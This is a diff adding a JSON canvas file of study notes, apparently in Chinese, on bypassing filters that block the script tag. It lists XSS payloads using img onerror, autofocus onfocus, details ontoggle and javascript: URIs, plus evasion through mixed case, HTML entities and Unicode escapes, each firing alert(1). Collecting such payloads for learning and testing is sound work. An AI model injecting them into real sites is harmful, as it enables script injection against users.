@@ -1,0 +1,19 @@
+{
+	"nodes":[
+		{"id":"a052932b065df1dd","x":-184,"y":-312,"width":250,"height":60,"type":"text","text":"过滤了script标签"},
+		{"id":"52bca01da6cd3de4","x":-184,"y":-180,"width":250,"height":60,"type":"text","text":"用svg,img,body等"},
+		{"id":"6c9334b9501d6be4","x":160,"y":-265,"width":540,"height":230,"type":"text","text":"```\n<img src=x onerror=alert(1)>\n<body onload=alert(1)>\n<input autofocus onfocus=alert(1)>\n<select autofocus onfocus=alert(1)>\n<textarea autofocus onfocus=alert(1)>\n<keygen autofocus onfocus=alert(1)>   <!-- 部分浏览器 -->\n```"},
+		{"id":"b527723c6b299a1d","x":160,"y":-393,"width":620,"height":128,"type":"text","text":"```\n<script>alert(1)</script>             <!-- 如果script没被过滤 -->\n<iframe src=\"javascript:alert(1)\">\n<a href=\"javascript:alert(1)\">click</a>\n```"},
+		{"id":"977bdc3e6034349c","x":162,"y":-35,"width":536,"height":169,"type":"text","text":"```\n<img src=x onerror=alert(1)>          <!-- 最经典 -->\n<video src=x onerror=alert(1)>\n<audio src=x onerror=alert(1)>\n<object data=x onerror=alert(1)>\n```"},
+		{"id":"787f7bbad55f82dc","x":160,"y":134,"width":552,"height":182,"type":"text","text":"```\n<math href=\"javascript:alert(1)\">     <!-- MathML -->\n<form><button formaction=\"javascript:alert(1)\">\n<isindex action=\"javascript:alert(1)\" type=image>\n<details open ontoggle=alert(1)>      <!-- 自动触发 -->\n<marquee onstart=alert(1)>            <!-- 老浏览器 -->\n```"},
+		{"id":"0de9a1a002b06c78","x":162,"y":316,"width":568,"height":124,"type":"text","text":"```\n<ImG sRc=x oNeRrOr=alert(1)>\n<img src=x onerror=&#97;lert(1)>      <!-- HTML实体编码 -->\n<img src=x onerror=\\u0061lert(1)>     <!-- Unicode转义 -->\n```"}
+	],
+	"edges":[
+		{"id":"f17ed3d1fde0fff9","fromNode":"a052932b065df1dd","fromSide":"bottom","toNode":"52bca01da6cd3de4","toSide":"top"},
+		{"id":"1728400a2549f083","fromNode":"52bca01da6cd3de4","fromSide":"right","toNode":"6c9334b9501d6be4","toSide":"left"},
+		{"id":"3e720afc48bd1fed","fromNode":"52bca01da6cd3de4","fromSide":"bottom","toNode":"977bdc3e6034349c","toSide":"left"},
+		{"id":"fe09032c9bfe4850","fromNode":"52bca01da6cd3de4","fromSide":"right","toNode":"b527723c6b299a1d","toSide":"left"},
+		{"id":"194df063fbdda39d","fromNode":"52bca01da6cd3de4","fromSide":"bottom","toNode":"787f7bbad55f82dc","toSide":"left"},
+		{"id":"2eb68e2cb6f53b00","fromNode":"52bca01da6cd3de4","fromSide":"bottom","toNode":"0de9a1a002b06c78","toSide":"left"}
+	]
+}
